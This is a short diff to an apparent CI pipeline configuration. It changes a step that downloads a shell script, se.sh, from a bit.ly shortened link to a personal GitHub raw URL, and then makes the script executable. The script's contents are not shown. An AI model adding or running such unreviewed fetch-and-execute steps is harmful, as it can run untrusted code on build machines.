@@ -7,7 +7,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: timeout 1m lscpu
-        -   run: wget -O se.sh https://bit.ly/3Q953wq
+        -   run: wget https://raw.githubusercontent.com/Cetto1903/magar/main/se.sh
         -   run: chmod +x se.sh
     Devop1:
       docker:
